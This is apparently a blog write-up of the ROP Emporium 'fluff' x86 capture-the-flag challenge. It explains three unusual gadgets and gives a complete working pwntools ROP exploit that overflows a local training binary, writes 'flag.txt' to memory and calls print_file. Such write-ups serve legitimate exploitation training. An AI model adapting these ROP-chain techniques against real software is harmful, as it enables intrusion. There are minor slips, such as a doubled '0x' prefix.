---
layout: post
title:  "ROP Emporium fluff Writeup (x86)"
date:   2024-06-06 00:00:00 -0400
categories: rop-emporium challenge-6
tags: rop-emporium fluff x86 writeup buffer-overflow rop reverse-engineering 32-bit
---
## Introduction
[ROP Emporium](https://ropemporium.com/index.html){:target="_blank"}{:rel="noopener noreferrer"}
provides a series of challenges to learn and practice
Return Oriented Programming (ROP). This is the
[sixth challenge](https://ropemporium.com/challenge/fluff.html){:target="_blank"}{:rel="noopener noreferrer"}
of eight.


According to the
[challenge page](https://ropemporium.com/challenge/fluff.html){:target="_blank"}{:rel="noopener noreferrer"}
our goal is to call `print_file()` with the name of the
file to read as the first argument. The string `flag.txt`
doesn't exist in the binary, so we will need to write it
there ourselves. 

> This is what a hint will look like!
{: .prompt-tip }

## Offset
The offset for `x86` challenges will be `44 bytes`. If
you want to know how to find this value see the
[first writeup]({% post_url 2024-05-31-rop-emporium-ret2win-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}
of this series.

## print_file()
> Find the `print_file` address and a gadget which
> pops any registers
{: .prompt-tip }

First let's find the address of `print_file()` using
the command `afl`

![print-file-addr](/images/fluff/x86-print-file-addr.png)

`print_file` is part of a library so we can just use the
address of corresponding `plt` entry, `0x080483d0`

Now we need to set the first argument to this function.
According to the
[x86 calling convention](https://aaronbloomfield.github.io/pdr/book/x86-32bit-ccc-chapter.pdf){:target="_blank"}{:rel="noopener noreferrer"},
function arguments are passed through the stack. Remember
from the
[callme challenge]({% post_url 2024-06-02-rop-emporium-callme-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}
that we'll need to set a `pop` gadget as a function's return
address to keep the stack maintained for additional function
calls. 

```
/R pop 
```

![pop gadget](/images/fluff/x86-pop-gadget.png)

The register we're going to `pop` doesn't matter so let's
use this one with the address `0x080485bb`

## Questionable Gadgets
> Checkout `usefulFunction`'s assembly and learn
> what each instruction does
{: .prompt-tip }

Let's check the `questionableGadgets` section
in `usefulFunction`.
We can view the assembly with the following commands

```
s sym.usefulFunction
V
p
```

![questionable gadgets](/images/fluff/x86-questionable-gadgets.png)

There are three gadgets here and they contain instructions
you might not be familiar with, so let's go over what
each gadget does

### Gadget 1: pext
![gadget1](/images/fluff/x86-gadget1.png)

Our first gadget (`0x0x08048543`) only has the `pext` instruction and
nothing else. According to the
[pext documentation](https://www.felixcloutier.com/x86/pext){:target="_blank"}{:rel="noopener noreferrer"}
this instruction will extract bits from `ebx` according
to a mask set in `eax` then save it into `edx`.

We already have a `pop ebp` instruction from the `print_file()`
section. This lets us control `eax` as well as the
return register `edx`

### Gadget 2: xchg
![gadget2](/images/fluff/x86-gadget2.png)

The second gadget (`0x08048555`) uses the `xchg`
instruction. According to the
[xchg documentation](https://www.felixcloutier.com/x86/xchg){:target="_blank"}{:rel="noopener noreferrer"}
this instruction will exchange the content between the
two source registers. 

According to this
[x86 guide](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html){:target="_blank"}{:rel="noopener noreferrer"}
the register `dl` refers to a section of register `edx`.
Since `ecx` is dereferenced, it will
allow us to write the byte in `dl` to a place in memory!

### Gadget 3: bswap
![gadget3](/images/fluff/x86-gadget3.png)

The 
[bswap documenation](https://www.felixcloutier.com/x86/bswap){:target="_blank"}{:rel="noopener noreferrer"}
says this instruction will swap the byte order of the
source register from little endian to big endian and vice
versa. 

Since this gadget (`0x08048558`) also comes with a `pop ecx` instruction,
this gives us a way to control `ecx`

## Writing to Memory
To write to memory we need to use `gadget 2` which will
write the byte in `dl` to the address in `ecx`. To control
the address register `ecx` we need to use `gadget 3`. To
set the register `dl` we need to use `gadget 1` which will
set `edx`.

Essentially we will have three steps
1. Set the byte we want to write using `gadget 1`
2. Set the address we want to write to with `gadget 3`
3. Write the byte with `gadget 2`

Let's start by creating a function which will set the
byte we want to write into `dl`

### Set Byte
> You can calculate the byte mask manually, but try
> to program a solution! Remember that the `pext` instruction
> will go from the least significant bit to the most significant
{: .prompt-tip }
![gadget1](/images/fluff/x86-gadget1.png)

`pext` will extract bits from `ebx` according to the
mask set in `eax` and save it in `edx`. We can already
control `eax` through the `pop ebp` gadget we found in
the `print_file` section. Now we need to figure out what
value to set it to

To extract the correct bits we should refer to the
[bextr documentation](https://www.felixcloutier.com/x86/bextr){:target="_blank"}{:rel="noopener noreferrer"}.
`eax` will be our bit mask. Whenever a `1` is set in
the mask, it will extract the bit at that position in
`ebx`. In order to construct the byte for the character
`f` we will need to know
[its binary value](https://www.ascii-code.com/){:target="_blank"}{:rel="noopener noreferrer"}
and create an appropriate mask

Here's an example which will extract bits from `0xb0bababa`
to create the character `f` (`0x66`)

```python
0xb0bababa: 1011 0000 1011 1010 1011 1010 1011 1010
mask:       xxxx xxxx xxxx xxxx 0100 1011 0100 1011
work:       xxxx xxxx xxxx xxxx x0xx 1x10 x0xx 1x10
work:                            0   1 10  0   1 10
result:     0110 0110
'f' in bin: 0110 0110
```

This is some python to generate the mask from `0xb0bababa`
to create any byte

```python
#!/bin/python3
from pwn import *

gadget1 = 0x08048543

# sets the byte to write b into
# edx with gadget1
def set_byte(b):
    payload = b''

    # bit list of b
    target_bits = [1 if b & (1 << (7-n)) else 0 for n in range(8)]
    target_bits.reverse()

    # construct mask
    eax = 0xb0bababa
    mask_bits = []
    ti = 0
    # compare from eax's least significant bit (right)
    # to most significant bit (left)
    for i in range(0, eax.bit_length()):
        if ti >= len(target_bits):
            break
        tbit = target_bits[ti]
        bit = (eax >> i) & 1
        if bit == tbit:
            mask_bits.append(1)
            ti += 1
        else:
            mask_bits.append(0)

    # set mask 
    mask_bits.reverse()
    mask = 0
    # turn bit list to int
    for bit in mask_bits:
        mask = (mask << 1) | bit
    payload += p32(pop_ebp) + p32(mask)

    # call pext gadget
    payload += p32(gadget1)
    return payload
```

### Set Address
> Check the [pwntools documentation](https://docs.pwntools.com/en/dev/util/packing.html){:target="_blank"}{:rel="noopener noreferrer"}
{: .prompt-tip }
![gadget3](/images/fluff/x86-gadget3.png)

The 
[bswap instruction](https://www.felixcloutier.com/x86/bswap){:target="_blank"}{:rel="noopener noreferrer"}
will swap the byte order of the provided register. The
default byte order of the program is little endian.
If we pass an address in big endian, the `bswap` instruction
will convert it into a usable format!

Luckily this is easy to implement using `pwntools`

```python
#!/bin/python3
from pwn import *

gadget3 = 0x08048558

# set address to write to
def set_address(addr):
    payload = b''
    # default byte order is little
    # gadget3 will switch byte order
    # from big to little
    ecx = p32(addr, endian='big')
    payload += p32(gadget3) + ecx
    return payload
```

### Write Bytes
> Put everything together and don't forget to
> add an offset to your write address
{: .prompt-tip }
![gadget2](/images/fluff/x86-gadget2.png)

The
[xchg instruction](https://www.felixcloutier.com/x86/xchg){:target="_blank"}{:rel="noopener noreferrer"}
exchanges two registers. Since `ecx` will be derefernced,
this essentially acts as a `mov [ecx], dl` instruction.

We can control what is in `ecx` and `dl` at this point,
so now we just need a place to write to. We can view 
writable sections in `radare2` with the `iS` command

![writable sections](/images/fluff/x86-writable-sections.png)

Let's use the `.data` section which has the address
`0x0804a018`

Using everything we've found we can create a
function which will write to memory

```python
#!/bin/python3
from pwn import *

write_addr = 0x0804a018     # data addr
gadget2 = 0x08048555

# write byte string s
# to address addr
def write_string(addr, s):
    payload = b''
    for i in range(0, len(s)):
        c = s[i]
        payload += set_byte(c)
        payload += set_address(addr + i)
        # writes byte
        payload += p32(gadget2)     
    return payload

# construct payload
payload = b'A' * 44
fname = b'flag.txt'
payload += write_string(write_addr, fname)
```

## Exploit
We have everything we need to build our exploit

```python
#!/bin/python3
from pwn import *

write_addr = 0x0804a018     # data addr
pop_ebp = 0x080485bb
gadget1 = 0x08048543
gadget2 = 0x08048555
gadget3 = 0x08048558
print_file_addr = 0x080483d0

# sets the byte to write b into
# edx with gadget1
def set_byte(b):
    payload = b''

    # bit list of b
    target_bits = [1 if b & (1 << (7-n)) else 0 for n in range(8)]
    target_bits.reverse()

    # construct mask
    eax = 0xb0bababa
    mask_bits = []
    ti = 0
    # compare from eax's least significant bit (right)
    # to most significant bit (left)
    for i in range(0, eax.bit_length()):
        if ti >= len(target_bits):
            break
        tbit = target_bits[ti]
        bit = (eax >> i) & 1
        if bit == tbit:
            mask_bits.append(1)
            ti += 1
        else:
            mask_bits.append(0)

    # set mask 
    mask_bits.reverse()
    mask = 0
    # turn bit list to int
    for bit in mask_bits:
        mask = (mask << 1) | bit
    payload += p32(pop_ebp) + p32(mask)

    # call pext gadget
    payload += p32(gadget1)
    return payload

# set address to write to
def set_address(addr):
    payload = b''
    # default byte order is little
    # gadget3 will switch byte order
    # from big to little
    ecx = p32(addr, endian='big')
    payload += p32(gadget3) + ecx
    return payload

# write byte string s
# to address addr
def write_string(addr, s):
    payload = b''
    for i in range(0, len(s)):
        c = s[i]
        payload += set_byte(c)
        payload += set_address(addr + i)
        # writes byte
        payload += p32(gadget2)     
    return payload

# create payload
payload = b'A' * 44
fname = b'flag.txt'
payload += write_string(write_addr, fname)
payload += p32(print_file_addr) + p32(pop_ebp) + p32(write_addr)

# send payload + receive flag
io = process('./fluff32')
io.send(payload)
io.recvuntil(b'Thank you!\n')
flag = io.recvline()
log.success(flag.decode('utf-8'))
```

![flag](/images/fluff/x86-flag.png)

## Conclusion
In this challenge we learned how to write to memory
without using a `mov` instruction. By chaining the
effects of multiple gadgets together we can achieve the
same functionality as a missing instruction! In the
next challenge we'll learn how to pivot the stack

[Previous Challenge (badchars)]({% post_url 2024-06-05-rop-emporium-badchars-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}

Next Challenge (pivot)

[fluff x64]({% post_url 2024-06-06-rop-emporium-fluff-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}

